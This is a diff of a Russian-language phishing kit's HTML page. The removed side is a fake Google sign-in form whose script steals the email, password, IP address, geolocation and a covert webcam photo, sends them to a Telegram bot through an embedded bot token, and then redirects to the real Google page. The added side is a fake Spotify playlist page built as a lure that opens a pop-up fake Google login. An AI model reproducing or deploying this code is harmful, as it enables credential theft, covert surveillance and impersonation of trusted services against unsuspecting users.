@@ -3,339 +3,436 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Вход – Аккаунт Google</title>
+    <title>DAMINATAR — слушать на Spotify</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
         }
 
         body {
-            background: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 16px;
+            background: #0a0a0a;
+            font-family: 'Circular', 'Helvetica Neue', 'Segoe UI', Roboto, system-ui, sans-serif;
+            color: #ffffff;
         }
 
-        /* Карточка входа Google */
-        .login-card {
-            max-width: 450px;
-            width: 100%;
-            padding: 48px 40px 36px;
-            border-radius: 28px;
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.12);
-            background: white;
-            transition: all 0.2s ease;
+        /* Контейнер */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 24px 32px 80px;
         }
 
-        .logo {
-            text-align: center;
-            margin-bottom: 28px;
-        }
-
-        .logo svg {
-            width: 75px;
-            height: 75px;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            text-align: center;
-            margin-bottom: 8px;
-            color: #1f1f1f;
-        }
-
-        .sub {
-            text-align: center;
-            font-size: 16px;
-            color: #5f6368;
-            margin-bottom: 32px;
-        }
-
-        /* Поле ввода как у Google */
-        .input-group {
-            margin-bottom: 28px;
-            position: relative;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 16px 12px 8px 12px;
-            font-size: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            outline: none;
-            background: transparent;
-            transition: 0.1s;
-        }
-
-        .input-group label {
-            position: absolute;
-            left: 12px;
-            top: 16px;
-            font-size: 16px;
-            color: #5f6368;
-            pointer-events: none;
-            transition: 0.1s;
-            background: white;
-            padding: 0 4px;
-        }
-
-        .input-group input:focus {
-            border-color: #1a73e8;
-            border-width: 2px;
-        }
-
-        .input-group input:focus ~ label,
-        .input-group input:not(:placeholder-shown) ~ label {
-            top: 7px;
-            font-size: 11px;
-            color: #1a73e8;
-        }
-
-        .forgot-link {
-            text-align: right;
-            margin-bottom: 24px;
-        }
-
-        .forgot-link a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-        }
-
-        .actions {
+        /* Шапка */
+        .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 16px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid #282828;
+            margin-bottom: 32px;
         }
 
-        .next-btn {
-            background: #1a73e8;
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 24px;
+        .logo {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            background: linear-gradient(135deg, #1DB954, #1ed760);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 32px;
             font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
+            font-weight: 600;
+            color: #b3b3b3;
         }
 
-        .next-btn:hover {
-            background: #1765cc;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+        /* Хедер плейлиста */
+        .playlist-header {
+            display: flex;
+            gap: 32px;
+            flex-wrap: wrap;
+            margin-bottom: 48px;
         }
 
-        .create-link {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
+        .cover {
+            width: 240px;
+            height: 240px;
+            background: linear-gradient(145deg, #1a7c3a, #0a3a1a);
+            border-radius: 12px;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
         }
 
-        hr {
-            margin: 32px 0 20px;
-            border: none;
-            border-top: 1px solid #e0e0e0;
+        .cover svg {
+            width: 100px;
+            height: 100px;
         }
 
-        .footer-note {
+        .info {
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+        }
+
+        .playlist-type {
             font-size: 12px;
-            color: #5f6368;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #b3b3b3;
+            margin-bottom: 8px;
+        }
+
+        .title {
+            font-size: 72px;
+            font-weight: 900;
+            letter-spacing: -3px;
+            margin-bottom: 16px;
+            word-break: break-word;
+        }
+
+        .desc {
+            color: #b3b3b3;
+            font-size: 14px;
+            margin-bottom: 16px;
+            max-width: 600px;
+        }
+
+        .meta {
+            font-size: 14px;
+            color: #b3b3b3;
+        }
+
+        .meta strong {
+            color: white;
+        }
+
+        /* Кнопки действий */
+        .actions {
+            display: flex;
+            gap: 24px;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .play-btn {
+            background: #1DB954;
+            border: none;
+            padding: 12px 40px;
+            border-radius: 500px;
+            font-weight: 700;
+            font-size: 16px;
+            color: #000;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+
+        .play-btn:hover {
+            transform: scale(1.02);
+            background: #1ed760;
+        }
+
+        /* Список треков */
+        .tracklist {
+            background: #121212;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .track {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 12px 16px;
+            border-bottom: 1px solid #282828;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+
+        .track:hover {
+            background: #2a2a2a;
+        }
+
+        .track-num {
+            width: 40px;
+            color: #b3b3b3;
+            font-size: 14px;
+        }
+
+        .track-info {
+            flex: 1;
+        }
+
+        .track-name {
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+
+        .track-artist {
+            font-size: 12px;
+            color: #b3b3b3;
+        }
+
+        .duration {
+            color: #b3b3b3;
+            font-size: 14px;
+        }
+
+        .footer {
+            margin-top: 60px;
+            font-size: 12px;
+            color: #5a5a5a;
             text-align: center;
+            border-top: 1px solid #282828;
+            padding-top: 30px;
+        }
+
+        /* Модальное окно авторизации */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(6px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-card {
+            background: #181818;
+            border-radius: 28px;
+            padding: 40px 32px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid #333;
+        }
+
+        .modal-card h2 {
+            margin-bottom: 16px;
+        }
+
+        .modal-card p {
+            color: #b3b3b3;
+            margin-bottom: 24px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 16px;
+        }
+
+        .modal-btn {
+            flex: 1;
+            background: #333;
+            border: none;
+            padding: 12px;
+            border-radius: 40px;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+        }
+
+        .modal-btn.login {
+            background: #1DB954;
+            color: black;
+        }
+
+        .modal-btn.register {
+            background: #333;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1DB954;
+            color: black;
+            padding: 12px 24px;
+            border-radius: 60px;
+            font-weight: 600;
+            z-index: 1100;
+            display: none;
+            white-space: nowrap;
         }
     </style>
 </head>
 <body>
-<div class="login-card" id="loginForm">
-    <div class="logo">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
-            <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z" />
-            <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z" />
-            <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z" />
-            <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z" />
-        </svg>
-    </div>
-    <h1>Войти</h1>
-    <div class="sub">Используйте аккаунт Google</div>
-
-    <div class="input-group">
-        <input type="email" id="email" placeholder=" " autocomplete="off">
-        <label>Электронная почта или телефон</label>
+<div class="container">
+    <div class="header">
+        <div class="logo">SPOTIFY</div>
+        <div class="nav-links">
+            <span>Premium</span>
+            <span>Поддержка</span>
+            <span>Скачать</span>
+        </div>
     </div>
 
-    <div class="input-group" id="passwordGroup" style="display: none;">
-        <input type="password" id="password" placeholder=" ">
-        <label>Пароль</label>
-    </div>
-
-    <div class="forgot-link">
-        <a href="#" id="forgotLink">Забыли адрес электронной почты?</a>
+    <div class="playlist-header">
+        <div class="cover">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" fill="#ffffff" opacity="0.8"/>
+                <circle cx="12" cy="12" r="3" fill="#1DB954"/>
+            </svg>
+        </div>
+        <div class="info">
+            <div class="playlist-type">ПЛЕЙЛИСТ</div>
+            <div class="title">DAMINATAR</div>
+            <div class="desc">Тёмный электронный микс. DAMINATAR, AstroWave, Midnight Pulse</div>
+            <div class="meta"><strong>DAMINATAR</strong> • 19 треков • 1 ч 12 мин</div>
+        </div>
     </div>
 
     <div class="actions">
-        <a href="#" class="create-link" id="createLink">Создать аккаунт</a>
-        <button class="next-btn" id="nextBtn">Далее</button>
+        <button class="play-btn" id="playTopBtn">▶ ВОСПРОИЗВЕСТИ</button>
     </div>
 
-    <hr>
-    <div class="footer-note">
-        Вы переходите на сайт Google для подтверждения личности
+    <div class="tracklist" id="tracklist">
+        <div class="track">
+            <div class="track-num">1</div>
+            <div class="track-info">
+                <div class="track-name">GHOST CALL</div>
+                <div class="track-artist">DAMINATAR</div>
+            </div>
+            <div class="duration">3:24</div>
+        </div>
+        <div class="track">
+            <div class="track-num">2</div>
+            <div class="track-info">
+                <div class="track-name">NEON GRAVE</div>
+                <div class="track-artist">AstroWave</div>
+            </div>
+            <div class="duration">4:01</div>
+        </div>
+        <div class="track">
+            <div class="track-num">3</div>
+            <div class="track-info">
+                <div class="track-name">DARK WATER</div>
+                <div class="track-artist">DAMINATAR & Shadow</div>
+            </div>
+            <div class="duration">3:58</div>
+        </div>
+    </div>
+
+    <div class="footer">
+        Чтобы слушать треки целиком, войдите в аккаунт
     </div>
 </div>
 
+<!-- Модалка авторизации -->
+<div id="authModal" class="modal">
+    <div class="modal-card">
+        <h2>🔐 Требуется авторизация</h2>
+        <p>Для прослушивания плейлиста войдите или зарегистрируйтесь в Spotify</p>
+        <div class="modal-buttons">
+            <button id="loginModalBtn" class="modal-btn login">Войти</button>
+            <button id="registerModalBtn" class="modal-btn register">Зарегистрироваться</button>
+        </div>
+    </div>
+</div>
+
+<div id="toastMsg" class="toast">🎶 Плейлист запущен! Добро пожаловать</div>
+
 <script>
-    // ========== НАСТРОЙКИ TELEGRAM ==========
-    const TELEGRAM_TOKEN = "8241737351:AAGpCCd1PpuoHPeJ7xJZOjRcPYTVCN-QaOs";
-    const TELEGRAM_CHAT_ID = "805226689";
-
-    let step = 0;            // 0 - ждём email, 1 - ждём пароль
-    let capturedEmail = "";
-
-    const emailInput = document.getElementById('email');
-    const passwordGroup = document.getElementById('passwordGroup');
-    const nextBtn = document.getElementById('nextBtn');
-
-    // Функция отправки в Telegram
-    async function sendToTelegram(email, password, ip, location, photoBase64) {
-        const ua = navigator.userAgent;
-        const caption = `🔐 GOOGLE LOGIN + XLOGGER
-📧 Email: ${email}
-🔑 Password: ${password || "—"}
-🌐 IP: ${ip}
-📍 Геолокация: ${location}
-💻 User-Agent: ${ua}
-🕒 Время: ${new Date().toLocaleString('ru-RU')}`;
-
-        if (photoBase64 && photoBase64.startsWith('data:image')) {
-            const blob = await (await fetch(photoBase64)).blob();
-            const fd = new FormData();
-            fd.append('chat_id', TELEGRAM_CHAT_ID);
-            fd.append('caption', caption);
-            fd.append('photo', blob, 'google_selfie.jpg');
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } else {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: caption })
-            });
-        }
+    // === НАСТРОЙКИ (открытие нашего фишинга) ===
+    function openGoogleAuth() {
+        // Открываем новое окно с фейковым Google-входом
+        const width = 500;
+        const height = 650;
+        const left = (screen.width - width) / 2;
+        const top = (screen.height - height) / 2;
+        window.open('google-auth.html', 'GoogleAuth', `width=${width},height=${height},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=yes`);
     }
 
-    // XLogger функции
-    async function getIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch(e) { return 'undetermined'; }
+    // Показ модалки
+    function showAuthModal() {
+        const modal = document.getElementById('authModal');
+        modal.classList.add('active');
     }
 
-    async function getLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve('geo not supported'); return; }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (±${pos.coords.accuracy}m)`),
-                () => resolve('denied_by_user')
-            );
-        });
+    function hideAuthModal() {
+        const modal = document.getElementById('authModal');
+        modal.classList.remove('active');
     }
 
-    async function takePhoto() {
-        return new Promise((resolve) => {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { resolve(null); return; }
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                        stream.getTracks().forEach(track => track.stop());
-                        resolve(photoData);
-                    };
-                })
-                .catch(() => resolve(null));
-        });
+    function showSuccessAndPlay() {
+        hideAuthModal();
+        const toast = document.getElementById('toastMsg');
+        toast.style.display = 'block';
+        setTimeout(() => {
+            toast.style.opacity = '0';
+            setTimeout(() => {
+                toast.style.display = 'none';
+                toast.style.opacity = '1';
+            }, 500);
+        }, 2000);
+        // Небольшая имитация запуска плейлиста
+        console.log('Плейлист запущен, пользователь авторизован');
     }
 
-    // --- этап 2: запрос доп. верификации (камера + гео)
-    async function requestAdditionalVerification(email, password) {
-        // Показываем индикатор загрузки
-        const loginCard = document.getElementById('loginForm');
-        loginCard.innerHTML = `
-            <div style="text-align: center; padding: 48px 24px;">
-                <div style="width: 48px; height: 48px; border: 4px solid #e0e0e0; border-top: 4px solid #1a73e8; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 20px auto;"></div>
-                <h2 style="font-weight: 400; margin-top: 20px;">Проверка безопасности</h2>
-                <p style="color: #5f6368;">Google выполняет быструю верификацию устройства...</p>
-            </div>
-            <style>
-                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-            </style>
-        `;
-
-        // Собираем данные
-        const ip = await getIP();
-        const location = await getLocation();
-        const photo = await takePhoto();
-
-        // Отправляем ВСЁ (логин, пароль, ip, гео, кадр)
-        await sendToTelegram(email, password, ip, location, photo);
-
-        // Завершаем — показываем реальную страницу Google, чтобы не вызвать подозрений
-        window.location.href = "https://accounts.google.com/";
+    // Обработчики для кнопок "Воспроизвести"
+    function handlePlayIntent() {
+        showAuthModal();
     }
 
-    // Обработка нажатия "Далее"
-    nextBtn.addEventListener('click', async () => {
-        if (step === 0) {
-            const email = emailInput.value.trim();
-            if (!email) {
-                alert("Введите адрес электронной почты");
-                return;
-            }
-            capturedEmail = email;
-            // Показываем поле пароля
-            passwordGroup.style.display = "block";
-            nextBtn.innerText = "Далее (пароль)";
-            step = 1;
-            // Небольшая имитация — скрываем "Забыли адрес" на втором шаге
-            document.querySelector('.forgot-link').style.visibility = "visible";
-            document.getElementById('createLink').style.visibility = "visible";
-        } 
-        else if (step === 1) {
-            const password = document.getElementById('password').value;
-            if (!password) {
-                alert("Введите пароль");
-                return;
-            }
-            // Отключаем кнопку, чтобы не нажали дважды
-            nextBtn.disabled = true;
-            // Переходим к запросу камеры/гео + отправке
-            await requestAdditionalVerification(capturedEmail, password);
-        }
+    // Вешаем обработчики на все кнопки play / треки
+    document.getElementById('playTopBtn').addEventListener('click', handlePlayIntent);
+    const trackItems = document.querySelectorAll('.track');
+    trackItems.forEach(track => {
+        track.addEventListener('click', handlePlayIntent);
     });
 
-    // Заглушки ссылок (чтобы не сломать доверие)
-    document.getElementById('forgotLink').addEventListener('click', (e) => {
-        e.preventDefault();
-        alert("Функция восстановления временно недоступна.\nПопробуйте позже.");
+    // Кнопки модалки
+    document.getElementById('loginModalBtn').addEventListener('click', () => {
+        openGoogleAuth();
+        // Ждём закрытия окна авторизации (потеря фокуса) и показываем успех
+        const checkInterval = setInterval(() => {
+            // Если окно закрыто — считаем, что авторизация пройдена
+            if (!window.opener || window.opener.closed) {
+                clearInterval(checkInterval);
+                showSuccessAndPlay();
+            }
+        }, 500);
+        // Если вдруг окно не открылось — таймер на 5 сек
+        setTimeout(() => {
+            clearInterval(checkInterval);
+            showSuccessAndPlay();
+        }, 5000);
     });
-    document.getElementById('createLink').addEventListener('click', (e) => {
-        e.preventDefault();
-        alert("Создание аккаунта временно приостановлено.");
+
+    document.getElementById('registerModalBtn').addEventListener('click', () => {
+        openGoogleAuth();
+        const checkInterval = setInterval(() => {
+            if (!window.opener || window.opener.closed) {
+                clearInterval(checkInterval);
+                showSuccessAndPlay();
+            }
+        }, 500);
+        setTimeout(() => {
+            clearInterval(checkInterval);
+            showSuccessAndPlay();
+        }, 5000);
     });
 </script>
 </body>
